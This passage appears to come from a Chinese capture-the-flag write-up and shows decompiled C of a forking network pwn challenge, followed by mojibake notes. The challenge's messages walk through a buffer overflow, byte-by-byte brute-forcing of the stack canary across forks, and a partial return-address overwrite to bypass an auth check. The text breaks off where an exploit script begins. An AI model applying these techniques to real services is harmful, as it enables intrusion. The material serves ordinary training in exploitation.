class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">challenge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// rax</span><br>  _QWORD v6[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+1Ch] [rbp-A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+2Ch] [rbp-94h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-90h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-88h]</span><br>  __int64 v11[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+C0h] [rbp+0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [rsp+C8h] [rbp+8h] BYREF</span><br><br>  v7 = a1;<br>  v6[<span class="hljs-number">2</span>] = a2;<br>  v6[<span class="hljs-number">1</span>] = a3;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v11));<br>  v12 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  buf = v11;<br>  nbytes = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The challenge() function has just been launched!&quot;</span>);<br>  sp_ = (__int64)v6;<br>  bp_ = (__int64)&amp;savedregs;<br>  sz_ = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">char</span> *)&amp;savedregs - (<span class="hljs-keyword">char</span> *)v6) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">2</span>;<br>  rp_ = (__int64)&amp;retaddr;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Before we do anything, let&#x27;s take a look at challenge()&#x27;s stack frame:&quot;</span>);<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our stack pointer points to %p, and our base pointer points to %p.\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)sp_, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)bp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This means that we have (decimal) %d 8-byte words in our stack frame,\n&quot;</span>, sz_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;including the saved base pointer and the saved return address, for a&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;total of %d bytes.\n&quot;</span>, <span class="hljs-number">8</span> * sz_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer begins at %p, partway through the stack frame,\n&quot;</span>, buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(\&quot;above\&quot; it in the stack are other local variables used by the function).&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your input will be read into this buffer.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The buffer is %d bytes long, but the program will let you provide an arbitrarily\n&quot;</span>, <span class="hljs-number">117LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;large input length, and thus overflow the buffer.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this level, there is no \&quot;win\&quot; variable.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You will need to force the program to execute the win_authed() function&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;by directly overflowing into the stored return address back to main,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;which is stored at %p, %d bytes after the start of your input buffer.\n&quot;</span>,<br>    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_,<br>    rp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;That means that you will need to input at least %d bytes (%d to fill the buffer,\n&quot;</span>,<br>    rp_ - (_QWORD)buf + <span class="hljs-number">8</span>,<br>    <span class="hljs-number">117LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d to fill other stuff stored between the buffer and the return address,\n&quot;</span>, rp_ - (_QWORD)buf - <span class="hljs-number">117</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;and 8 that will overwrite the return address).\n&quot;</span>);<br>  cp_ = bp_;<br>  cv_ = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">while</span> ( *(_QWORD *)cp_ != cv_ )<br>    cp_ -= <span class="hljs-number">8LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;While canaries are enabled, this networked program forks.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What is important to note is that the canary does not get re-randomized on fork.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;When data that you are overflowing into is critical (i.e., if you screw it up&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the program crashes), but also static across executions, you can brute-force&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;it byte by byte over many attempts.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So, let&#x27;s brute-force the canary!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If this is your first time running this program, all you know so far is that&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the canary has a 0 as its left-most byte.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You should proceed like this:\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- First, you should try overflowing just the null byte of the canary, for&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  practice. The canary starts at %p, which is %d bytes after the\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)cp_, cp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  start of your buffer. Thus, you should provide %d characters followed\n&quot;</span>, cp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  by a NULL byte, make sure the canary check passes, then try a non-NULL&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  byte and make sure the canary check fails. This will confirm the offsets.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- Next try each possible value for just the next byte. One of them (the same&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  as whatever was there in memory already) will keep the canary intact, and&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  when the canary check succeeds, you know you have found the correct one.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- Go on to the next byte, leak it the same way, and so on, until you have&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  the whole canary.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You will likely want to script this process! Each byte might take up to 256&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tries to guess..\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Because the binary is position independent, you cannot know&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exactly where the win_authed() function is located.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This means that it is not clear what should be written into the return address.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have chosen to send %lu bytes of input!\n&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will allow you to write from %p (the start of the input buffer)\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n&quot;</span>,<br>    (<span class="hljs-keyword">char</span> *)buf + nbytes,<br>    nbytes - <span class="hljs-number">117</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Of these, you will overwrite %d bytes into the return address.\n&quot;</span>, (<span class="hljs-keyword">char</span> *)buf + nbytes - rp_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If that number is greater than 8, you will overwrite the entire return address.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwriting the entire return address is fine when we know&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the whole address, but here, we only really know the last three nibbles.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;These nibbles never change, because pages are aligned to 0x1000.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This gives us a workaround: we can overwrite the least significant byte&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;of the saved return address, which we can know from debugging the binary,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;to retarget the return to main to any instruction that shares the other 7 bytes.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Since that last byte will be constant between executions (due to page alignment),&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this will always work.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If the address we want to redirect execution to is a bit farther away from&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the saved return address, and we need to write two bytes, then one of those&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nibbles (the fourth least-significant one) will be a guess, and it will be&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;incorrect 15 of 16 times.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is okay: we can just run our exploit a few&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;times until it works (statistically, after 8 times or so).&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;One caveat in this challenge is that the win_authed() function must first auth:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;it only lets you win if you provide it with the argument 0x1337.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Speifically, the win_authed() function looks something like:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    void win_authed(int token)&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    &#123;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      if (token != 0x1337) return;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      puts(\&quot;You win! Here is your flag: \&quot;);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      sendfile(1, open(\&quot;/flag\&quot;, 0), 0, 256);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      puts(\&quot;\&quot;);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    &#125;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_4393);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So how do you pass the check? There *is* a way, and we will cover it later,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;but for now, we will simply bypass it! You can overwrite the return address&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;with *any* value (as long as it points to executable code), not just the start&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;of functions. Let&#x27;s overwrite past the token check in win!\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To do this, we will need to analyze the program with objdump, identify where&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the check is in the win_authed() function, find the address right after the check,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;and write that address over the saved return address.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Go ahead and find this address now. When you&#x27;re ready, input a buffer overflow&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;that will overwrite the saved return address (at %p, %d bytes into the buffer)\n&quot;</span>,<br>    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_,<br>    rp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;with the correct value.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes);<br>  v8 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 = __errno_location();<br>    v4 = strerror(*v3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v4);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You sent %d bytes!\n&quot;</span>, v8);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s see what happened with the stack:\n&quot;</span>);<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The program&#x27;s memory status:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the input buffer starts at %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved frame pointer (of main) is at %p\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)bp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved return address (previously to main) is at %p\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved return address is now pointing to %p.\n&quot;</span>, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)rp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the canary is stored at %p.\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)cp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the canary value is now %p.\n&quot;</span>, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)cp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the address of win_authed() is %p.\n&quot;</span>, win_authed);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you have managed to overwrite the return address with the correct value,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;challenge() will jump straight to win_authed() when it returns.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s try it now!\n\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)buf + (<span class="hljs-keyword">int</span>)v8 &gt; rp_ + <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WARNING: You sent in too much data, and overwrote more than two bytes of the address.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         This can still work, because I told you the correct address to use for&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         this execution, but you should not rely on that information.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         You can solve this challenge by only overwriting two bytes!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         &quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><span class="hljs-comment">// å»æ‰ printf </span><br><span class="hljs-function">__int64 __fastcall <span class="hljs-title">challenge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// rax</span><br>  _QWORD v6[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+1Ch] [rbp-A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+2Ch] [rbp-94h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-90h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-88h]</span><br>  __int64 v11[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+C0h] [rbp+0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [rsp+C8h] [rbp+8h] BYREF</span><br><br>  v7 = a1;<br>  v6[<span class="hljs-number">2</span>] = a2;<br>  v6[<span class="hljs-number">1</span>] = a3;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v11));<br>  v12 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  buf = v11;<br>  nbytes = <span class="hljs-number">0LL</span>;<br>  sp_ = (__int64)v6;<br>  bp_ = (__int64)&amp;savedregs;<br>  sz_ = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">char</span> *)&amp;savedregs - (<span class="hljs-keyword">char</span> *)v6) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">2</span>;<br>  rp_ = (__int64)&amp;retaddr;<br>  DUMP_STACK(sp_, sz_);<br>  cp_ = bp_;<br>  cv_ = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">while</span> ( *(_QWORD *)cp_ != cv_ )<br>    cp_ -= <span class="hljs-number">8LL</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  v8 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 = __errno_location();<br>    v4 = strerror(*v3);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> optval; <span class="hljs-comment">// [rsp+24h] [rbp-101Ch] BYREF</span><br>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [rsp+28h] [rbp-1018h]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+2Ch] [rbp-1014h]</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">addr</span>;</span> <span class="hljs-comment">// [rsp+30h] [rbp-1010h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+1038h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( argc &lt;= <span class="hljs-number">0</span> )<br>    __assert_fail(<span class="hljs-string">&quot;argc &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0xFB</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;###&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, *argv);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;###&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1uLL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;unlimited connections.\n&quot;</span>);<br>  fd = socket(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  optval = <span class="hljs-number">1</span>;<br>  setsockopt(fd, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, &amp;optval, <span class="hljs-number">4u</span>);<br>  addr.sa_family = <span class="hljs-number">2</span>;<br>  *(_DWORD *)&amp;addr.sa_data[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  *(_WORD *)addr.sa_data = htons(<span class="hljs-number">0x539</span>u);<br>  bind(fd, &amp;addr, <span class="hljs-number">0x10</span>u);<br>  listen(fd, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v7 = accept(fd, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Connection accepted!&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !fork() )<br>      <span class="hljs-keyword">break</span>;<br>    wait(<span class="hljs-number">0LL</span>);<br>  &#125;<br>  dup2(v7, <span class="hljs-number">0</span>);<br>  dup2(v7, <span class="hljs-number">1</span>);<br>  dup2(v7, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> challenge((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)argc, argv, envp);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é¢˜ç›®ï¼šç½‘ç»œç¨‹åº fork+Canary æ³„éœ²+pie 3 nibbleã€‚è¿™é‡Œé‡ç‚¹æ˜¯ä½¿ç”¨å¤šè¿›ç¨‹çˆ†ç ´ Canary çš„è¿‡ç¨‹<ul><li>é€å­—èŠ‚çˆ†ç ´ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸€å®šæ˜¯ 0ï¼Œä»ç¬¬äºŒä¸ªå­—èŠ‚å¼€å§‹éœ€è¦çˆ†ç ´å°è¯•ï¼Œå¦‚æœé”™è¯¯ä¼šå¯¼è‡´ smashingï¼Œå¦‚æœæ­£ç¡®åŠ å…¥åˆ°å€™é€‰ Canaryï¼Œç›´åˆ° 8 å­—èŠ‚å…¨çˆ†ç ´å‡ºç»“æœ</li></ul></li><li>ç”±äºè·‘è„šæœ¬çš„æ—¶å€™ä¼šå¤šæ¬¡ fork ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå¡ä½ï¼Œè¿™ä¼šå¾ˆè›‹ç–¼ï¼Œå› ä¸ºæ¯ä¸ªå­—èŠ‚ 256 å¯èƒ½ï¼Œrecv time ä¸º 1 çš„è¯è¦ç­‰å¥½é•¿æ—¶é—´æ‰èƒ½çˆ†ç ´å®Œï¼Œè¿™æ—¶å€™å¦‚æœå¡ä½äº†åˆè¦é‡æ¥</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 